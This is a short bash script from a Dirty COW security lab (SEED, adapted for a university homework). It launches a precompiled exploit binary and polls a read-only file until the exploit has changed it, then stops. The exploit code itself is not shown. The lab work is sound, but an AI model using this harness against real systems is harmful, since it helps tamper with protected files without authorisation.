# This script is for learning purpose of dirty COW lab powered by SEED from Syracuse University
# Slightly modified for Johns Hopkins University homework.

#!/bin/bash

set -eu

trap "kill 0" SIGINT
COW_FILE="/zzz"
COW_FILE_ORIG="/zzz.bak"
dirtyc0w="/home/seed/a.out"

$dirtyc0w &
COW_PID=$!
while true
    do
        if ! cmp -s $COW_FILE $COW_FILE_ORIG
            then
        echo "SUCCESS... The file has been changed under read only mode."
        kill -9 $COW_PID
        exit 1
            else
        echo "COW attack in progress..."
        fi
    sleep 1
done
